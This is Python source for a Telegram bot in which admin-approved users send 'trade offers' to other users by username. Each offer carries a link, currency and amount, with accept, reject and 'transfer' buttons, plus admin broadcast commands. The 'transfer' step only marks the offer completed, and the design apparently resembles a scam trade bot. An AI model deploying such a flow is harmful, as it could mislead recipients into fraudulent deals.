def gen_id(n=8):
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n))


def edit_or_send_text(message, text, reply_markup=None):
    """Редактирует текущее меню вместо создания дубликатов."""
    return message.edit_text(text, reply_markup=reply_markup)


async def show_main_menu(message, uid):
    """Возвращает пользователя в главное меню через редактирование сообщения."""
    try:
        await message.edit_text(
            e(t(uid, "welcome")),
            reply_markup=main_menu_kb(uid)
        )
    except Exception:
        await message.answer(
            e(t(uid, "welcome")),
            reply_markup=main_menu_kb(uid)
        )


async def send_offer_to_recipient(bot_instance, recipient_id, offer_id):
    o = offers[offer_id]
    offer_lang = o.get("offer_language", "ru")

    text = TEXTS[offer_lang]["offer_to_recipient"].format(
        amount=o["amount"],
        currency=o["currency"],
        link=o["link"]
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=TEXTS[offer_lang]["btn_reject"],
            callback_data=f"reject:{offer_id}",
            icon_custom_emoji_id=EMOJI_MAP["✖️"]
        ),
        InlineKeyboardButton(
            text=TEXTS[offer_lang]["btn_accept"],
            callback_data=f"accept:{offer_id}",
            icon_custom_emoji_id=EMOJI_MAP["✅"]
        ),
    ]])

    # Оффер отправляется отдельным сообщением с кнопками на выбранном языке.
    await bot_instance.send_message(
        recipient_id,
        e(text),
        reply_markup=kb
    )


@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id

    started_users.add(uid)
    if message.from_user.username:
        username_to_id[message.from_user.username.lower()] = uid

    if uid not in user_langs:
        await message.answer(
            LANG_PROMPT,
            reply_markup=language_kb()
        )
        return

    # При /start всегда вызывается меню. Если последнее меню можно отредактировать,
    # оно будет отредактировано; иначе отправляется одно новое меню.
    await message.answer(e("🔷"))
    await message.answer(
        e(t(uid, "welcome")),
        reply_markup=main_menu_kb(uid)
    )

    await deliver_pending(uid, message.from_user.username)


async def deliver_pending(uid, username):
    if not username:
        return
    uname = username.lower()
    if uname in pending_offers:
        for oid in list(pending_offers[uname]):
            if oid in offers and offers[oid]["status"] == "pending":
                try:
                    await send_offer_to_recipient(bot, uid, oid)
                except Exception:
                    pass
        pending_offers.pop(uname, None)


LANG_PROMPT = "🌐 Choose language / Выберите язык / 选择语言"


@dp.callback_query(F.data.startswith("lang:"))
async def cb_lang(cb: CallbackQuery, state: FSMContext):
    code = cb.data.split(":", 1)[1]
    if code not in LANGUAGES:
        await cb.answer()
        return

    user_langs[cb.from_user.id] = code
    uid = cb.from_user.id

    started_users.add(uid)
    if cb.from_user.username:
        username_to_id[cb.from_user.username.lower()] = uid

    # То же сообщение превращается в главное меню.
    await cb.message.edit_text(
        e(t(uid, "welcome")),
        reply_markup=main_menu_kb(uid)
    )
    await cb.answer(t(uid, "language_changed"))
    await deliver_pending(uid, cb.from_user.username)


@dp.callback_query(F.data.startswith("offerlang:"))
async def cb_offer_language(cb: CallbackQuery, state: FSMContext):
    code = cb.data.split(":", 1)[1]
    if code not in LANGUAGES:
        await cb.answer()
        return

    await state.update_data(offer_language=code)
    await state.set_state(OfferFlow.confirm)

    uid = cb.from_user.id
    await cb.message.edit_text(
        e(t(uid, "t_confirm")),
        reply_markup=confirm_kb(uid)
    )
    await cb.answer()


@dp.callback_query(F.data == "settings")
async def cb_settings(cb: CallbackQuery):
    uid = cb.from_user.id
    await cb.message.edit_text(
        t(uid, "choose_language"),
        reply_markup=language_kb(include_back=True, uid=uid)
    )
    await cb.answer()


@dp.message(Command("dostup"))
async def cmd_dostup(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /dostup @username")
        return
    uname = parts[1].strip().lstrip("@").lower()
    verified_handles.add(uname)
    await message.answer(f"Доступ выдан @{uname}")


@dp.message(Command("undostup"))
async def cmd_undostup(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /undostup @username")
        return
    uname = parts[1].strip().lstrip("@").lower()
    verified_handles.discard(uname)
    await message.answer(f"Доступ снят с @{uname}")


@dp.message(Command("m"))
async def cmd_m(message: Message):
    if message.from_user.id not in ADMINS:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /m текст")
        return
    txt = parts[1]
    sent = 0
    for uid in list(started_users):
        try:
            await message.bot.send_message(uid, txt, parse_mode=None)
            sent += 1
        except Exception:
            pass
    await message.answer(f"Отправлено: {sent}")


@dp.message(Command("offers"))
async def cmd_offers(message: Message):
    if message.from_user.id not in ADMINS:
        return
    active = {k: v for k, v in offers.items() if v["status"] == "pending"}
    if not active:
        await message.answer("Активных офферов нет")
        return
    lines = ["Активные офферы:"]
    for oid, o in active.items():
        lines.append(
            f"#{oid} | @{o['creator_username']} → {o['recipient']} | "
            f"{o['amount']} {o['currency']}"
        )
    await message.answer("\n".join(lines))


@dp.callback_query(F.data == "create_offer")
async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id

    if uid not in ADMINS:
        uname = (cb.from_user.username or "").lower()
        if uname not in verified_handles:
            await cb.answer(t(uid, "verify_required"), show_alert=True)
            for admin_id in ADMINS:
                try:
                    await cb.bot.send_message(
                        admin_id,
                        f"Пользователь @{cb.from_user.username or cb.from_user.id} "
                        f"(ID: {uid}) запрашивает доступ к созданию офферов."
                    )
                except Exception:
                    pass
            return

    await state.set_state(OfferFlow.username)
    await cb.message.edit_text(
        e(t(uid, "t_username")),
        reply_markup=back_kb(uid, "main")
    )
    await cb.answer()


@dp.callback_query(F.data == "exit_main")
async def cb_exit_main(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    try:
        await cb.message.delete()
    except Exception:
        pass
    await cb.answer()


@dp.callback_query(F.data.startswith("back:"))
async def cb_back(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    target = cb.data.split(":", 1)[1]

    if target == "main":
        await state.clear()
        await cb.message.edit_text(
            e(t(uid, "welcome")),
            reply_markup=main_menu_kb(uid)
        )
    elif target == "username":
        await state.set_state(OfferFlow.username)
        await cb.message.edit_text(
            e(t(uid, "t_username")),
            reply_markup=back_kb(uid, "main")
        )
    elif target == "link":
        await state.set_state(OfferFlow.link)
        await cb.message.edit_text(
            e(t(uid, "t_link")),
            reply_markup=back_kb(uid, "username")
        )
    elif target == "currency":
        await state.set_state(OfferFlow.currency)
        await cb.message.edit_text(
            e(t(uid, "t_currency")),
            reply_markup=currency_kb(uid)
        )
    elif target == "amount":
        await state.set_state(OfferFlow.amount)
        await cb.message.edit_text(
            e(t(uid, "t_amount")),
            reply_markup=back_kb(uid, "currency")
        )

    await cb.answer()


@dp.callback_query(F.data.startswith("cur:"))
async def cb_currency(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    cur = cb.data.split(":", 1)[1]

    await state.update_data(currency=cur)
    await state.set_state(OfferFlow.amount)

    await cb.message.edit_text(
        e(t(uid, "t_amount")),
        reply_markup=back_kb(uid, "currency")
    )
    await cb.answer()


@dp.callback_query(F.data == "confirm_offer")
async def cb_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    data = await state.get_data()

    if (
        not data
        or "amount" not in data
        or "recipient" not in data
        or "link" not in data
        or "currency" not in data
        or "offer_language" not in data
    ):
        await cb.answer()
        return

    await state.clear()

    oid = gen_id()
    offer = {
        "id": oid,
        "creator_id": uid,
        "creator_username": cb.from_user.username or str(uid),
        "recipient": data["recipient"],
        "link": data["link"],
        "currency": data["currency"],
        "amount": data["amount"],
        "offer_language": data["offer_language"],
        "status": "pending",
    }
    offers[oid] = offer

    ru = data["recipient"].lstrip("@").lower()
    rid = username_to_id.get(ru)

    if rid:
        try:
            await send_offer_to_recipient(cb.bot, rid, oid)
        except Exception:
            pending_offers.setdefault(ru, []).append(oid)
    else:
        pending_offers.setdefault(ru, []).append(oid)

    notify = t(
        uid,
        "notify_sent",
        creator=offer["creator_username"],
        amount=offer["amount"],
        currency=offer["currency"],
        recipient=data["recipient"]
    )

    try:
        await cb.bot.send_message(uid, e(notify))
    except Exception:
        pass

    await cb.message.edit_text(
        e(t(uid, "welcome")),
        reply_markup=main_menu_kb(uid)
    )
    await cb.answer()


@dp.message(OfferFlow.username)
async def msg_username(message: Message, state: FSMContext):
    uid = message.from_user.id
    txt = (message.text or "").strip()

    if not txt.startswith("@") or len(txt) < 2:
        await message.answer(t(uid, "invalid_username"))
        return

    await state.update_data(recipient=txt)
    await state.set_state(OfferFlow.link)

    await message.answer(
        e(t(uid, "t_link")),
        reply_markup=back_kb(uid, "username")
    )


@dp.message(OfferFlow.link)
async def msg_link(message: Message, state: FSMContext):
    uid = message.from_user.id
    await state.update_data(link=(message.text or "").strip())
    await state.set_state(OfferFlow.currency)

    await message.answer(
        e(t(uid, "t_currency")),
        reply_markup=currency_kb(uid)
    )


@dp.message(OfferFlow.amount)
async def msg_amount(message: Message, state: FSMContext):
    uid = message.from_user.id
    txt = (message.text or "").strip()

    if not txt.isdigit():
        await message.answer(t(uid, "invalid_amount"))
        return

    await state.update_data(amount=int(txt))
    await state.set_state(OfferFlow.offer_language)

    await message.answer(
        e(t(uid, "t_offer_language")),
        reply_markup=language_kb(prefix="offerlang")
    )


@dp.callback_query(F.data.startswith("reject:"))
async def cb_reject(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]

    if oid in offers:
        offers[oid]["status"] = "rejected"
        del offers[oid]

    try:
        await cb.message.delete()
    except Exception:
        pass

    await cb.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(cb: CallbackQuery):
    uid = cb.from_user.id
    oid = cb.data.split(":", 1)[1]

    if oid not in offers:
        await cb.answer()
        return

    o = offers[oid]

    # Язык сделки совпадает с языком оффера.
    offer_lang = o.get("offer_language", "ru")
    await cb.answer(
        TEXTS[offer_lang]["accept_alert"],
        show_alert=True
    )

    trade_id = gen_id()
    cname = CURRENCY_NAMES.get(o["currency"], "")

    text = TEXTS[offer_lang]["trade_text"].format(
        trade_id=trade_id,
        amount=o["amount"],
        currency=o["currency"],
        creator=o["creator_username"],
        link=o["link"],
        cname=cname
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=TEXTS[offer_lang]["btn_transfer"],
            callback_data=f"transfer:{oid}",
            icon_custom_emoji_id=EMOJI_MAP["✅"]
        )
    ]])

    await cb.message.edit_text(e(text), reply_markup=kb)


@dp.callback_query(F.data.startswith("transfer:"))
async def cb_transfer(cb: CallbackQuery):
    uid = cb.from_user.id
    oid = cb.data.split(":", 1)[1]

    if oid in offers:
        offers[oid]["status"] = "completed"
        offer_lang = offers[oid].get("offer_language", "ru")
    else:
        offer_lang = get_lang(uid)

    await cb.message.edit_text(
        e(TEXTS[offer_lang]["transfer_done"])
    )
    await cb.answer()


@dp.message()
async def track_user(message: Message):
    if message.from_user and message.from_user.username:
        username_to_id[message.from_user.username.lower()] = message.from_user.id


